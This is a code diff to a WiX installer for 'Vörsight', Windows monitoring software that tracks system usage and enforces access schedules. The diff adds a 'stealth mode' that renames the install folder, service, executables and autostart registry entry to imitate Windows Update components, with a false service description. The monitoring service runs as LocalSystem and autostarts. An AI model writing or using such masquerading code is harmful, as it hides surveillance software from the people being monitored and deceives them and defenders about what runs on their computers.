@@ -5,7 +5,7 @@
     <MediaTemplate EmbedCab="yes" />
 
     <StandardDirectory Id="ProgramFiles64Folder">
-      <Directory Id="INSTALLFOLDER" Name="Vörsight">
+      <Directory Id="INSTALLFOLDER" Name="!(bind.property.APPFOLDER_NAME)">
         <Directory Id="DRIVECREDENTIALSFOLDER" Name="DriveCredentials" />
       </Directory>
     </StandardDirectory>
@@ -17,7 +17,59 @@
     </Feature>
     
     <!-- Properties -->
+    <Property Id="USE_STEALTH_MODE" Value="0" />
     <Property Id="OAUTH_JSON" Secure="yes" Hidden="yes" />
+    
+    <!-- Conditional naming properties -->
+    <SetProperty Id="APPFOLDER_NAME" Value="Vörsight" Before="CostFinalize" Sequence="first">
+      NOT USE_STEALTH_MODE
+    </SetProperty>
+    <SetProperty Id="APPFOLDER_NAME" Value="Windows Update Helper" Before="CostFinalize" Sequence="first">
+      USE_STEALTH_MODE
+    </SetProperty>
+    
+    <SetProperty Id="SERVICE_EXE_NAME" Value="Vorsight.Service.exe" Before="CostFinalize" Sequence="first">
+      NOT USE_STEALTH_MODE
+    </SetProperty>
+    <SetProperty Id="SERVICE_EXE_NAME" Value="WindowsUpdateService.exe" Before="CostFinalize" Sequence="first">
+      USE_STEALTH_MODE
+    </SetProperty>
+    
+    <SetProperty Id="AGENT_EXE_NAME" Value="Vorsight.Agent.exe" Before="CostFinalize" Sequence="first">
+      NOT USE_STEALTH_MODE
+    </SetProperty>
+    <SetProperty Id="AGENT_EXE_NAME" Value="wuhelper.exe" Before="CostFinalize" Sequence="first">
+      USE_STEALTH_MODE
+    </SetProperty>
+    
+    <SetProperty Id="SERVICE_NAME" Value="VorsightService" Before="CostFinalize" Sequence="first">
+      NOT USE_STEALTH_MODE
+    </SetProperty>
+    <SetProperty Id="SERVICE_NAME" Value="WUHelperService" Before="CostFinalize" Sequence="first">
+      USE_STEALTH_MODE
+    </SetProperty>
+    
+    <SetProperty Id="SERVICE_DISPLAY_NAME" Value="Vorsight Monitoring Service" Before="CostFinalize" Sequence="first">
+      NOT USE_STEALTH_MODE
+    </SetProperty>
+    <SetProperty Id="SERVICE_DISPLAY_NAME" Value="Windows Update Helper Service" Before="CostFinalize" Sequence="first">
+      USE_STEALTH_MODE
+    </SetProperty>
+    
+    <SetProperty Id="SERVICE_DESCRIPTION" Value="Monitors system usage and enforces access schedules." Before="CostFinalize" Sequence="first">
+      NOT USE_STEALTH_MODE
+    </SetProperty>
+    <SetProperty Id="SERVICE_DESCRIPTION" Value="Provides background update checking and system health monitoring." Before="CostFinalize" Sequence="first">
+      USE_STEALTH_MODE
+    </SetProperty>
+    
+    <SetProperty Id="AGENT_REGISTRY_NAME" Value="VorsightAgent" Before="CostFinalize" Sequence="first">
+      NOT USE_STEALTH_MODE
+    </SetProperty>
+    <SetProperty Id="AGENT_REGISTRY_NAME" Value="WindowsUpdateHelper" Before="CostFinalize" Sequence="first">
+      USE_STEALTH_MODE
+    </SetProperty>
+    
     <!-- Other properties moved to ConfigDialog.wxs -->
     
     <!-- UI Configuration -->
@@ -33,16 +85,16 @@
   <Fragment>
     <ComponentGroup Id="ServiceComponents" Directory="INSTALLFOLDER">
       <Component Id="VorsightServiceComponent" Guid="*" Bitness="always64">
-        <File Id="VorsightServiceExe" Source="..\Vorsight.Service\bin\Release\net10.0\win-x64\publish\Vorsight.Service.exe" KeyPath="yes" />
+        <File Id="VorsightServiceExe" Source="..\Vorsight.Service\bin\Release\net10.0\win-x64\publish\Vorsight.Service.exe" Name="[SERVICE_EXE_NAME]" KeyPath="yes" />
         <ServiceInstall Id="ServiceInstaller"
                         Type="ownProcess"
-                        Name="VorsightService"
-                        DisplayName="Vorsight Monitoring Service"
-                        Description="Monitors system usage and enforces access schedules."
+                        Name="[SERVICE_NAME]"
+                        DisplayName="[SERVICE_DISPLAY_NAME]"
+                        Description="[SERVICE_DESCRIPTION]"
                         Start="auto"
                         Account="LocalSystem"
                         ErrorControl="normal" />
-        <ServiceControl Id="StartService" Start="install" Stop="both" Remove="uninstall" Name="VorsightService" Wait="yes" />
+        <ServiceControl Id="StartService" Start="install" Stop="both" Remove="uninstall" Name="[SERVICE_NAME]" Wait="yes" />
       </Component>
 
       <Component Id="ServiceConfigComponent" Guid="*" Bitness="always64">
@@ -62,9 +114,9 @@
 
     <ComponentGroup Id="AgentComponents" Directory="INSTALLFOLDER">
       <Component Id="VorsightAgentComponent" Guid="*" Bitness="always64">
-        <File Id="VorsightAgentExe" Source="..\Vorsight.Agent\bin\Release\net10.0-windows\win-x64\publish\Vorsight.Agent.exe" KeyPath="yes" />
+        <File Id="VorsightAgentExe" Source="..\Vorsight.Agent\bin\Release\net10.0-windows\win-x64\publish\Vorsight.Agent.exe" Name="[AGENT_EXE_NAME]" KeyPath="yes" />
         <!-- Auto-start Registry Key for the Agent -->
-        <RegistryValue Root="HKLM" Key="Software\Microsoft\Windows\CurrentVersion\Run" Name="VorsightAgent" Type="string" Value="[INSTALLFOLDER]Vorsight.Agent.exe" />
+        <RegistryValue Root="HKLM" Key="Software\Microsoft\Windows\CurrentVersion\Run" Name="[AGENT_REGISTRY_NAME]" Type="string" Value="[INSTALLFOLDER][AGENT_EXE_NAME]" />
       </Component>
     </ComponentGroup>
     
